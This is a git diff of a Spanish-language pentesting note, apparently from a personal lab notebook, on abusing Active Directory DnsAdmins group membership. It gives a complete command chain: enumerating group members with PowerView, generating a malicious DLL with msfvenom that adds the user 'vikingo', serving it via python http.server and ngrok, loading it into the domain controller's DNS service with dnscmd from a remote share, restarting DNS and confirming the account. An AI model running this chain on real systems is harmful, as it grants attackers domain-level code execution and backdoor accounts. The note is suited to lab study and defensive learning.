@@ -1,6 +1,8 @@
 # DNS Admins 
 
-Tags: #AD #DNSAdmins
+Tags: #AD #DNSAdmins #DLL #Windows 
+
+El grupo `DnsAdmins` en Active Directory es un grupo especial que tiene privilegios administrativos sobre el servicio DNS del dominio. Si un atacante logra comprometer una cuenta de usuario que es miembro de este grupo, podría realizar una serie de ataques maliciosos, aprovechando los privilegios elevados sobre la infraestructura de DNS.
 
 ```bash 
 1. Modificación de Registros DNS: El atacante podría cambiar los registros DNS para redirigir el tráfico de red legítimo a sistemas bajo su control. Esto se podría utilizar para realizar ataques de hombre en el medio, capturar credenciales, distribuir malware, o para desacreditar la infraestructura de red de una organización.
@@ -18,33 +20,13 @@ Tags: #AD #DNSAdmins
 ## Utilizando PowerView.ps1
 
 ```powershell 
-❯ Get-NetGroupMember -Identity "DnsAdmins" -Recurse
+❯ Get-NetGroupMember -Identity "DnsAdmins" -Recurse   # Obtener los miembros del grupo 'DNSAdmins'
 ```
 
 ## Utilizando NET
 
 ```powershell
-❯ net user dnsadmin.user /domain
-```
-
-## Cargando una dll maliciosa con dnscmd
-
-```powershell
-# Impersonando al usuario dnsadmin.user
-❯ runas /netonly /user:spartancybersec.corp\dnsadmin.user "powershell.exe"
-
-❯ hostname
-❯ dnscmd First-DC /config /serverlevelplugindll \\10.0.1.50\shared\adduser2.dll
-```
-
-```powershell
-❯ sc.exe \\First-DC stop dns 
-❯ sc.exe \\First-DC start dns
-❯ net user vikingo
-```
-
-```powershell
-❯ Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\InternalParameters
+❯ net user dnsadmin.user /domain   # Muestra info datallada de inicio de sesion, cambio de password, etc... del usuario que es miembro del grupo "DNSAdmins" 
 ```
 
 ## Generando una DLL maliciosa
@@ -53,5 +35,45 @@ Tags: #AD #DNSAdmins
 * [DNS-exe-persistance](https://github.com/dim0x69/dns-exe-persistance)
 
 ```powershell
-❯ msfvenom -p windows/x64/exec cmd='net user vikingo P4ssw0rd /add' -f dll -o adduser2.dll
+❯ msfvenom -p windows/x64/exec cmd='net user vikingo P4ssw0rd /add' -f dll -o ADModule.dll
+
+	# p = Payload a cargar 
+	# cmd = Comando a ejecutar (Añadir un usuario 'vikingo' y su password)
+	# f = Formato del payload 
+	# o = Output del payload 
+```
+
+```bash 
+❯ python3 -m http.server 80    # Compartimos el archivo 
+❯ ngrok http 80                # Compartimos el puerto 'http' con el recurso compartido a nivel público  
+```
+
+## Cargando una dll maliciosa con dnscmd
+
+```powershell
+# Estos comandos se deben ejecutar en el DC
+
+# Impersonando al usuario dnsadmin.user
+❯ runas /netonly /user:spartancybersec.corp\dnsadmin.user "powershell.exe"   # Ejecutara una ventana de 'Powershell'
+
+Nota: Aunque se ingrese la password mal se abrirá el 'Powershell' por lo que se debe tener cuidado al ingresarla para que funcione de manera correcta 
+
+
+❯ hostname   
+❯ dnscmd First-DC /config /serverlevelplugindll \\10.0.1.50\shared\ADModule.dll
+
+	# Ruta del archivo donde se encuentra la dll maliciosa 
+```
+
+```powershell
+❯ sc.exe \\First-DC stop dns      # Detener el servicio de DNS
+❯ sc.exe \\First-DC start dns     # Reiniciar el servicio de DNS
+❯ net user vikingo                # Verificar si se creo el usuario que esta en la dll maliciosa 
+❯ net user vikingo /domain 
+```
+
+```powershell
+# En los registros se puede ver el usuario
+
+❯ Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\InternalParameters 
 ```
